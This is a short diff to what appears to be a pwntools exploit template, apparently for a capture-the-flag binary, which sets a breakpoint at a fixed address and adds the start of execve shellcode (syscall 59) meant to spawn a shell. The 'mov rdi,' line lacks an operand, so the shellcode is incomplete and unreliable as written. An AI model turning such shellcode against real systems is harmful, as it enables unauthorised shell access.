@@ -33,11 +33,17 @@ def start(argv=[], *a, **kw):
         return start_remote(argv, *a, **kw)
 
 gdbscript = '''
-tbreak main
+b *0x4012b3
 continue
 '''.format(**locals())
 
 # -- Exploit goes here --
+
+shell = asm("""
+        mov rax, 59
+        mov rdi, 
+        syscall
+            """)
 
 io = start()
 
